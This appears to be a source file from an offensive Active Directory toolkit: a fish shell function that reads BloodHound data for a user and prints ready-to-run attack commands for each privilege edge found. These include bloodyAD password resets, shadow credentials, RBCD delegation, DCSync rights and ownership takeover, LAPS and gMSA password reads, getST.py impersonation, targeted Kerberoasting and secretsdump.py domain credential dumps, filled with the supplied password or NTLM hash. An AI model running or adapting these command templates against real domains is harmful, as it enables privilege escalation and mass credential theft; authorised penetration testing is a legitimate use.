function __ezpz_path_print --argument-names command
    printf '%s\n' (__ezpz_cmd_format "$command")
end

function __ezpz_path_getst --argument-names base domain user secret hash dc spn target_user mode
    set -l command
    if test -n "$hash"
        set command "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes '$hash' '$domain/$user'"
    else
        set command "getST.py -spn $spn -impersonate $target_user -dc-ip $dc '$domain/$user:$secret@$dc'"
    end
    if test "$mode" = option
        ezpz_cmd "$command"
    else
        printf '%s\n' "$command"
    end
end

function __ezpz_path_secretsdump --argument-names domain user secret hash dc
    if test -n "$hash"
        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc -hashes '$hash' '$domain/$user@$dc'"
    else
        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc '$domain/$user:$secret@$dc'"
    end
end

function __ezpz_path_generic --argument-names base target target_type target_name user domain secret hash dc
    switch $target_type
        case User
            ezpz_info "Option 1: change password"
            ezpz_cmd "$base set password $target '<NEWPASS>'"
            ezpz_info "Option 2: shadow credentials"
            ezpz_cmd "$base add shadowCredentials $target"
        case Group
            __ezpz_path_print "$base add groupMember $target $user"
        case Computer
            ezpz_info "Option 1: shadow credentials"
            ezpz_cmd "$base add shadowCredentials $target"
            ezpz_info "Option 2: RBCD + getST"
            ezpz_cmd "$base add rbcd $target $user"
            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>" option
        case Domain
            __ezpz_path_print "$base add dcsync $user"
            __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
        case '*'
            printf '%s\n' "No bloodyAD template for $target_type target."
    end
end

function _ezpz_path
    source "$EZPZ_HOME/functions/_ezpz_colors.fish"
    ezpz_banner path

    set -l usage "
Usage: ezpz path -u <user> -d <domain> (-p <password> | -H <hash>) [-f <bloodhound.zip>] [-t <dc>]

Shows one-hop AD attack paths for a user from BloodHound data.

  -u, --user      Principal to analyze (required)
  -d, --domain    Domain used in generated commands (required)
  -p, --password  Password used in generated commands (required unless -H)
  -H, --hash      NTLM hash used in generated commands (required unless -p)
  -f, --file      BloodHound zip (default: <domain>_bloodhound.zip)
  -t, --target    DC IP or hostname used in generated commands
  -h, --help      Show this help message
"

    argparse 'u/user=' 'f/file=' 'd/domain=' 't/target=' 'p/password=' 'H/hash=' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    set -l source_user ""
    if set -q _flag_user
        set source_user $_flag_user
    end
    if test -z "$source_user"
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end
    if string match -q '*@*' -- $source_user; or string match -rq '\\\\' -- $source_user
        ezpz_error "Use a bare username in -u and pass the domain with -d/--domain."
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing required argument: -d/--domain"
        echo $usage
        return 1
    end
    set -l domain (string lower -- $_flag_domain)

    if not set -q _flag_password; and not set -q _flag_hash
        ezpz_error "Missing authentication: use -p/--password or -H/--hash."
        echo $usage
        return 1
    end

    set -l zip_file ""
    if set -q _flag_file
        set zip_file $_flag_file
    else
        set zip_file (find . -maxdepth 1 -iname "$domain"_bloodhound.zip -type f 2>/dev/null | sort | tail -1)
    end
    if test -z "$zip_file"; or not test -f "$zip_file"
        ezpz_error "BloodHound zip not found for domain $domain. Use -f/--file or run enumdomain first."
        return 1
    end

    set -l helper "$EZPZ_HOME/utils/bloodhound_paths.py"
    if not test -f "$helper"
        ezpz_error "BloodHound path helper not found: $helper"
        return 1
    end

    set -l records (python3 "$helper" --zip "$zip_file" --from "$source_user" 2>&1)
    set -l rc $status
    if test $rc -ne 0
        ezpz_error "$records"
        return 1
    end

    set -l paths
    for record in $records
        set -l fields (string split \t -- $record)
        if test "$fields[1]" != SOURCE
            set -a paths $record
        end
    end

    set -l dc ""
    if set -q _flag_target
        set dc $_flag_target
    else
        set dc (ezpz_dc_ip $domain)
    end
    test -n "$dc"; or set dc "<DC>"

    set -l secret ""
    set -l hash ""
    if set -q _flag_hash
        set hash $_flag_hash
    else if set -q _flag_password
        set secret $_flag_password
    end
    test -n "$secret"; or set secret "<PASS>"
    set -l base_secret $secret
    if test -n "$hash"
        set base_secret $hash
    end

    set -l base "bloodyAD -H $dc -d $domain -u $source_user -p $base_secret"

    ezpz_header "Attack paths for $source_user"
    if test (count $paths) -eq 0
        printf '%s\n' "No attack paths found."
        echo
        ezpz_success "Done."
        return 0
    end

    set -l first_edge 1
    for record in $paths
        set -l fields (string split \t -- $record)
        set -l edge $fields[1]
        set -l target $fields[2]
        set -l target_type $fields[3]
        set -l target_dn $fields[4]
        set -l target_name $fields[5]
        set -l via $fields[6]
        if contains -- $target_type GPO OU CertTemplate Container
            continue
        end
        if test $first_edge -eq 0
            echo
        end
        set first_edge 0
        set -l label "$edge: $target"
        if test -n "$via"
            set label "$label ($via)"
        end
        ezpz_info "$label"

        switch $edge
            case ForceChangePassword
                __ezpz_path_print "$base set password $target '<NEWPASS>'"
            case GenericAll AllExtendedRights WriteAllProperties
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
            case GenericWrite
                switch $target_type
                    case User
                        ezpz_info "Option 1: shadow credentials"
                        ezpz_cmd "$base add shadowCredentials $target"
                        ezpz_info "Option 2: targeted Kerberoast"
                        if test -n "$hash"
                            ezpz_cmd "targetedkerberoast -d $domain -H '$hash' --request-user $target"
                        else
                            ezpz_cmd "targetedkerberoast -d $domain -u $source_user -p '$secret' --request-user $target"
                        end
                    case Computer
                        ezpz_info "Option 1: shadow credentials"
                        ezpz_cmd "$base add shadowCredentials $target"
                        ezpz_info "Option 2: RBCD + getST"
                        ezpz_cmd "$base add rbcd $target $source_user"
                        __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>" option
                    case '*'
                        printf '%s\n' "No bloodyAD template for GenericWrite on $target_type target."
                end
            case WriteDacl
                if test "$target_type" = Domain
                    __ezpz_path_print "$base add dcsync $source_user"
                    __ezpz_path_secretsdump "$domain" "$source_user" "$secret" "$hash" "$dc"
                else
                    ezpz_info "Step 1: grant GenericAll"
                    __ezpz_path_print "$base add genericAll $target $source_user"
                    ezpz_info "Step 2: exploit GenericAll"
                    __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
                end
            case WriteOwner Owns
                ezpz_info "Step 1: take ownership"
                __ezpz_path_print "$base set owner $target $source_user"
                ezpz_info "Step 2: grant GenericAll"
                __ezpz_path_print "$base add genericAll $target $source_user"
                ezpz_info "Step 3: exploit GenericAll"
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
            case AddMember AddSelf
                __ezpz_path_print "$base add groupMember $target $source_user"
            case DCSync GetChangesAll
                __ezpz_path_secretsdump "$domain" "$source_user" "$secret" "$hash" "$dc"
            case AddKeyCredentialLink
                __ezpz_path_print "$base add shadowCredentials $target"
            case ReadLAPSPassword
                __ezpz_path_print "$base get object $target --attr ms-Mcs-AdmPwd"
            case ReadGMSAPassword
                __ezpz_path_print "$base get object $target --attr msDS-ManagedPassword"
            case AllowedToAct
                ezpz_info "Step 1: configure RBCD"
                __ezpz_path_print "$base add rbcd $target $source_user"
                ezpz_info "Step 2: request service ticket"
                __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
            case AllowedToDelegate
                __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "$target" "<IMPERSONATED_USER>"
            case '*'
                continue
        end
    end

    echo
    ezpz_success "Done."
end
